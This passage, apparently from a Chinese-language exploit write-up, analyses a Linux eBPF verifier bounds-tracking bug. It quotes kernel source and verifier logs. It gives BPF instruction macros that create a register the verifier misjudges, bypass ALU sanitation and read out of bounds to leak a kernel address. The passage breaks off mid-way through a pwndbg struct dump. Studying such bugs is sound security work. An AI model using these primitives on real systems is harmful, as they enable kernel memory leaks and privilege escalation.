</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">signed_add32_overflows</span><span style="color:#c0c5ce;">(dst_reg-&gt;s32_min_value, smin_val) ||
</span><span style="color:#c0c5ce;">	    </span><span style="color:#8fa1b3;">signed_add32_overflows</span><span style="color:#c0c5ce;">(dst_reg-&gt;s32_max_value, smax_val)) {
</span><span style="color:#c0c5ce;">		dst_reg-&gt;s32_min_value = S32_MIN;
</span><span style="color:#c0c5ce;">		dst_reg-&gt;s32_max_value = S32_MAX;
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		dst_reg-&gt;s32_min_value += smin_val;
</span><span style="color:#c0c5ce;">		dst_reg-&gt;s32_max_value += smax_val;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(dst_reg-&gt;u32_min_value + umin_val &lt; umin_val ||
</span><span style="color:#c0c5ce;">	    dst_reg-&gt;u32_max_value + umax_val &lt; umax_val) {
</span><span style="color:#c0c5ce;">		dst_reg-&gt;u32_min_value = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">		dst_reg-&gt;u32_max_value = U32_MAX;
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		dst_reg-&gt;u32_min_value += umin_val;
</span><span style="color:#c0c5ce;">		dst_reg-&gt;u32_max_value += umax_val;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">}
</span><span style="color:#b48ead;">static bool </span><span style="color:#8fa1b3;">signed_add32_overflows</span><span style="color:#c0c5ce;">(s32 </span><span style="color:#bf616a;">a</span><span style="color:#c0c5ce;">, s32 </span><span style="color:#bf616a;">b</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Do the add in u32, where overflow is well-defined */
</span><span style="color:#c0c5ce;">	s32 res = (s32)((u32)a + (u32)b);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(b &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> res &gt; a;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> res &lt; a;
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>之后调用<code>__reg_bound_offset()</code>，将边界值反向赋值给<code>var_off</code> 具体如下：</p>
<ul>
<li><code>tnum_range()</code>返回<code>{.value=0x1, .mask=0x0}</code></li>
<li>此时<code>var_off=0</code>，再传入<code>tnum_intersect()</code></li>
<li>得到<code>{.value=0x1, .mask=0x0}</code>
即获得了一个32位值<strong>实际为0</strong>，但<strong>verifier认为是1</strong>的寄存器</li>
</ul>
<blockquote>
<p>上一条指令 R6显示为0
+R7后 低32位确定为0x1</p>
</blockquote>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">35: R0_w=inv0 R6=inv(id=0,umax_value=4294967296,var_off=(0x0; 0x100000000),s32_min_value=1,s32_max_value=0,u32_min_value=1,u32_max_value=0) R7_w=inv(id=0,smax_value=9223372032559808513,umax_value=18446744069414584321,var_off=m
</span><span style="color:#c0c5ce;">35: (0f) r6 += r7
</span><span style="color:#c0c5ce;">36: R0_w=inv0 R6_w=inv(id=0,smax_value=9223372032559808513,umax_value=18446744069414584321,var_off=(0x1; 0xffffffff00000000),s32_min_value=1,s32_max_value=1,u32_min_value=1,u32_max_value=1) R7_w=inv(id=0,smax_value=9223372032m
</span></pre>
<p>再给R6+1
此时32位<code>var_off</code>变为2</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">36: (07) r6 += 1
</span><span style="color:#c0c5ce;">37: R0_w=inv0 R6_w=inv(id=0,smin_value=-9223372036854775806,smax_value=9223372032559808514,umin_value=2,umax_value=18446744069414584322,var_off=(0x2; 0xffffffff00000000),s32_min_value=2,s32_max_value=2,u32_max_value=2)
</span></pre>
<p>然后再和1做与运算
此时verifier会认为该值变成0，但实际运行值为1</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">37: (57) r6 &amp;= 1
</span><span style="color:#c0c5ce;">38: R0_w=inv0 R6_w=inv0 R7_w=inv(id=0,smax_value=9223372032559808513,umax_value=18446744069414584321,var_off=(0x0; 0xffffffff00000001),s32_min_value=0,s32_max_value=1,u32_max_value=1)
</span></pre>
<p>R7寄存器构造 可以通过从map中获取一个verifier全不可知的寄存器 再用32位判断跳转指令 <code>BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2)</code> 使其变为 <code>{ .var_off = 0, .mask = 0xffffffff00000001}</code> 即可，map 中的值是我们可控的所以我们可以使其运行时值为 0 ：</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">MAKE_VULN_REG</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">__map_fd</span><span style="color:#c0c5ce;">)                         \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* load value into r3, make it [0, 1] under 32 bit */                </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_8), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_LDX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_7, BPF_REG_8, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_JMP32_IMM</span><span style="color:#c0c5ce;">(BPF_JLE, BPF_REG_7, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">),        \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_0, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),                    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_EXIT_INSN</span><span style="color:#c0c5ce;">(),                                \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_ADD, VULN_REG, BPF_REG_7),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, VULN_REG, </span><span style="color:#d08770;">0x1</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_AND, VULN_REG, </span><span style="color:#d08770;">0x1</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_0, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span></pre>
<blockquote>
<p>verifier会将认为不可达的指令patch为跳转回条件分支指令
无法在verifier认为恒为假的分支中藏恶意指令</p>
</blockquote>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* The verifier does more data flow analysis than llvm and will not
</span><span style="color:#65737e;"> * explore branches that are dead at run time. Malicious programs can
</span><span style="color:#65737e;"> * have dead code too. Therefore replace all dead at-run-time code
</span><span style="color:#65737e;"> * with &#39;ja -1&#39;.
</span><span style="color:#65737e;"> *
</span><span style="color:#65737e;"> * Just nops are not optimal, e.g. if they would sit at the end of the
</span><span style="color:#65737e;"> * program and through another bug we would manage to jump there, then
</span><span style="color:#65737e;"> * we&#39;d execute beyond program memory otherwise. Returning exception
</span><span style="color:#65737e;"> * code also wouldn&#39;t work since we can have subprogs where the dead
</span><span style="color:#65737e;"> * code could be located.
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">sanitize_dead_code</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_verifier_env *</span><span style="color:#bf616a;">env</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn_aux_data *aux_data = env-&gt;insn_aux_data;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn trap = </span><span style="color:#8fa1b3;">BPF_JMP_IMM</span><span style="color:#c0c5ce;">(BPF_JA, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn *insn = env-&gt;prog-&gt;insnsi;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">const int</span><span style="color:#c0c5ce;"> insn_cnt = env-&gt;prog-&gt;len;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; insn_cnt; i++) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(aux_data[i].</span><span style="color:#bf616a;">seen</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">continue</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(insn + i, &amp;trap, sizeof(trap));
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">}
</span></pre>
<h3 id="nei-he-di-zhi-xie-lou">内核地址泄漏</h3><p>不能直接向<code>BPF_FUNC_map_lookup_elem()</code>传入verifier认为是0 实际是负数的寄存器
对于<code>BPF_MAP_TYPE_ARRAY</code>类型map查找元素时使用<code>array_map_lookup_elem()</code>函数</p>
<pre style="background-color:#2b303b;">
<span style="color:#8fa1b3;">BPF_MAP_TYPE</span><span style="color:#c0c5ce;">(BPF_MAP_TYPE_ARRAY, array_map_ops)
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_map_ops array_map_ops = {
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">map_lookup_elem </span><span style="color:#c0c5ce;">= array_map_lookup_elem,
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>这里index是无符号类型 故无法前向读取</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* Called from syscall or from eBPF program */
</span><span style="color:#b48ead;">static void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">array_map_lookup_elem</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *</span><span style="color:#bf616a;">map</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_array *array = </span><span style="color:#8fa1b3;">container_of</span><span style="color:#c0c5ce;">(map, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_array, map);
</span><span style="color:#c0c5ce;">	u32 index = *(u32 *)key;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">unlikely</span><span style="color:#c0c5ce;">(index &gt;= array-&gt;map.</span><span style="color:#bf616a;">max_entries</span><span style="color:#c0c5ce;">))
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> array-&gt;value + array-&gt;elem_size * (index &amp; array-&gt;index_mask);
</span><span style="color:#c0c5ce;">}
</span></pre>
<h4 id="alu-sanitation-bypass">ALU Sanitation bypass</h4><p><code>ALU Sanitation</code>用于运行时动态检测，弥补verifier静态分析的不足
通过<code>fixup_bpf_calls()</code>为eBPF中每条指令前加上额外辅助指令实现</p>
<p>对于<code>BFP_ADD</code>和<code>BPF_SUB</code>，添加如下辅助指令</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">fixup_bpf_calls</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_verifier_env *</span><span style="color:#bf616a;">env</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">//...
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; insn_cnt; i++, insn++) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">//...
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(insn-&gt;code == (BPF_ALU64 | BPF_ADD | BPF_X) ||
</span><span style="color:#c0c5ce;">		    insn-&gt;code == (BPF_ALU64 | BPF_SUB | BPF_X)) {
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">const</span><span style="color:#c0c5ce;"> u8 code_add = BPF_ALU64 | BPF_ADD | BPF_X;
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">const</span><span style="color:#c0c5ce;"> u8 code_sub = BPF_ALU64 | BPF_SUB | BPF_X;
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn insn_buf[</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn *patch = &amp;insn_buf[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;"> issrc, isneg;
</span><span style="color:#c0c5ce;">			u32 off_reg;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">			aux = &amp;env-&gt;insn_aux_data[i + delta];
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!aux-&gt;alu_state ||
</span><span style="color:#c0c5ce;">			    aux-&gt;alu_state == BPF_ALU_NON_POINTER)
</span><span style="color:#c0c5ce;">				</span><span style="color:#b48ead;">continue</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">			isneg = aux-&gt;alu_state &amp; BPF_ALU_NEG_VALUE;
</span><span style="color:#c0c5ce;">			issrc = (aux-&gt;alu_state &amp; BPF_ALU_SANITIZE) ==
</span><span style="color:#c0c5ce;">				BPF_ALU_SANITIZE_SRC;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">			off_reg = issrc ? insn-&gt;src_reg : insn-&gt;dst_reg;
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(isneg)
</span><span style="color:#c0c5ce;">				*patch++ = </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, off_reg, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">			*patch++ = </span><span style="color:#8fa1b3;">BPF_MOV32_IMM</span><span style="color:#c0c5ce;">(BPF_REG_AX, aux-&gt;alu_limit - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">			*patch++ = </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_AX, off_reg);
</span><span style="color:#c0c5ce;">			*patch++ = </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_OR, BPF_REG_AX, off_reg);
</span><span style="color:#c0c5ce;">			*patch++ = </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_NEG, BPF_REG_AX, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">			*patch++ = </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ARSH, BPF_REG_AX, </span><span style="color:#d08770;">63</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(issrc) {
</span><span style="color:#c0c5ce;">				*patch++ = </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_AND, BPF_REG_AX,
</span><span style="color:#c0c5ce;">							 off_reg);
</span><span style="color:#c0c5ce;">				insn-&gt;src_reg = BPF_REG_AX;
</span><span style="color:#c0c5ce;">			} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">				*patch++ = </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_AND, off_reg,
</span><span style="color:#c0c5ce;">							 BPF_REG_AX);
</span><span style="color:#c0c5ce;">			}
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(isneg)
</span><span style="color:#c0c5ce;">				insn-&gt;code = insn-&gt;code == code_add ?
</span><span style="color:#c0c5ce;">					     code_sub : code_add;
</span><span style="color:#c0c5ce;">			*patch++ = *insn;
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(issrc &amp;&amp; isneg)
</span><span style="color:#c0c5ce;">				*patch++ = </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, off_reg, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">			cnt = patch - insn_buf;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">			new_prog = </span><span style="color:#8fa1b3;">bpf_patch_insn_data</span><span style="color:#c0c5ce;">(env, i + delta, insn_buf, cnt);
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!new_prog)
</span><span style="color:#c0c5ce;">				</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-ENOMEM;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">			delta    += cnt - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">			env-&gt;prog = prog = new_prog;
</span><span style="color:#c0c5ce;">			insn      = new_prog-&gt;insnsi + i + delta;
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">continue</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">		}
</span></pre>
<p>如果某条ALU运算指令的操作数是1个指针和1个标量，则计算alu_limit 也即最大绝对值，就是该指针可以进行加减的安全范围。在该指令之前必须加上如下指令，off_reg表示与指针作运算的标量寄存器，BPF_REG_AX是辅助寄存器</p>
<p>具体：</p>
<ul>
<li>（1）将<code>alu_limit</code>载入<code>BPF_REG_AX</code>。</li>
<li>（2）<code>BPF_REG_AX = alu_limit - off_reg</code>，如果 <code>off_reg &gt; alu_limit</code>，则<code>BPF_REG_AX</code>最高位符号位置位。</li>
<li>（3）若<code>BPF_REG_AX</code>为正，<code>off_reg</code>为负，则表示<code>alu_limit</code>和寄存器的值符号相反，则<code>BPF_OR</code>操作会设置该符号位。</li>
<li>（4）<code>BPF_NEG</code>会使符号位置反，1-&gt;0，0-&gt;1。</li>
<li>（5）<code>BPF_ARSH</code>算术右移63位，<code>BPF_REG_AX</code>只剩符号位。</li>
<li>（6）根据以上运算结果，<code>BPF_AND</code>要么清零<code>off_reg</code>要么使其不变。</li>
</ul>
<p>总体看来，如果<code>off_reg &gt; alu_limit</code> 或者二者符号相反，表示有可能发生指针越界，则<code>off_reg</code>会被替换为0，清空指针运算。反之，如果标量在合理范围内<code>0 &lt;= off_reg &lt;= alu_limit</code>，则算术移位会将<code>BPF_REG_AX</code>填为1，这样<code>BPF_AND</code>运算不会改变该标量。</p>
<p>对于减法  可读范围为<code>(ptr-alu_limit, ptr]</code>（以指针最初指向的地址为 <code>0</code>）
想要越界则需要调整范围让<code>aux-&gt;alu_limit</code>变大：</p>
<ul>
<li>构造一个运行时为1、verifier认为是0的R8</li>
<li>R8乘一个不大于value size的值（eg *0x1000）</li>
<li>将指向map第一个元素第一个字节<code>valuie[0]</code>的寄存器（假设是R7）加上0x1000，此时<code>alu_limit</code>变为0x1000，R7指向<code>value[0x1000]</code></li>
<li><code>R7-=R8</code>，verifier认为R8=0 从而<code>alu_limit</code>不变，但R7实际指回了<code>value[0]</code></li>
<li></li>
</ul>
<blockquote>
<p>在内核版本 5.11.8 之前 ALU Sanitation 存在一个漏洞，即 <code>aux_alu_limit</code> 被初始化为 0 从而导致 <code>0-1</code> 造成整型溢出变为一个巨大的值，在<a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/patch/?id=10d2bb2e6b1d8c4576c56a748f697dbeb8388899">这个 commit</a> 中才被修复，因此对于 5.11.8 之前版本的内核而言是不需要绕过该检查的</p>
</blockquote>
<h4 id="oob-read-on-bpf-array">OOB-read on bpf_array</h4><p>可以前向读取泄漏<code>btp_array</code>结构体中的<code>btp_map</code>结构体中的<code>bpf_map_ops *ops</code>指针，从而得到内核基地址
将值存到<code>map[1]</code>，再用<code>bpf_map_lookup_elem()</code>获取结果到程序中</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">key = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_lookup_elem</span><span style="color:#c0c5ce;">(map_fd, &amp;key, &amp;value) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to look up value!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">}
</span></pre>
<blockquote>
<p>下面是调试相关</p>
</blockquote>
<p>确定map中value与map_ops偏移：
调用<code>BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem)</code>，进<code>map_lookup_elem()</code>，在其中获得map地址</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_array {
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map map;
</span><span style="color:#c0c5ce;">	u32 elem_size;
</span><span style="color:#c0c5ce;">	u32 index_mask;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_array_aux *aux;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">union </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] </span><span style="color:#8fa1b3;">__aligned</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*ptrs[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] </span><span style="color:#8fa1b3;">__aligned</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;"> __percpu *pptrs[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] </span><span style="color:#8fa1b3;">__aligned</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">	};
</span><span style="color:#c0c5ce;">};
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">READ_KERNEL_INFO</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">__map_fd</span><span style="color:#c0c5ce;">)                      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* extend the alu-&gt;limit and do the oob read */ </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_7), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_8, VULN_REG),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, BPF_REG_7, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">),      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, BPF_REG_8, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">),      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, BPF_REG_8),   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, VULN_REG, </span><span style="color:#d08770;">0x110</span><span style="color:#c0c5ce;">),        \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, VULN_REG),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_LDX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_8, BPF_REG_7, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* save the value into map */                   </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_7), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_STX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_7, BPF_REG_8, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span></pre>
<p>这里查看到map地址对应结构体bpf_map，但其wrapper为bpf_array类型（bpf_map内嵌于bpf_array结构体中）</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">pwndbg&gt; p map
</span><span style="color:#c0c5ce;">$8 = (struct bpf_map *) 0xffffc900000b7000
</span><span style="color:#c0c5ce;">pwndbg&gt; p/x *(struct bpf_array *) map
</span><span style="color:#c0c5ce;">$10 = {
</span><span style="color:#c0c5ce;">  map = {
</span><span style="color:#c0c5ce;">    ops = 0xffffffff82b0cc00,
</span><span style="color:#c0c5ce;">    inner_map_meta = 0x0,
</span><span style="color:#c0c5ce;">    security = 0x0,
</span><span style="color:#c0c5ce;">    map_type = 0x2,
</span><span style="color:#c0c5ce;">    key_size = 0x4,
</span><span style="color:#c0c5ce;">    value_size = 0x2000,
</span><span style="color:#c0c5ce;">    max_entries = 0x100,
</span><span style="color:#c0c5ce;">    map_flags = 0x0,
</span><span style="color:#c0c5ce;">    spin_lock_off = 0xffffffea,
</span><span style="color:#c0c5ce;">    id = 0x1,
</span><span style="color:#c0c5ce;">    numa_node = 0xffffffff,
</span><span style="color:#c0c5ce;">    btf_key_type_id = 0x0,
</span><span style="color:#c0c5ce;">    btf_value_type_id = 0x0,
</span><span style="color:#c0c5ce;">    btf = 0x0,
</span><span style="color:#c0c5ce;">    memcg = 0xffff888005726000,
</span><span style="color:#c0c5ce;">    name = {0x0 &lt;repeats 16 times&gt;},
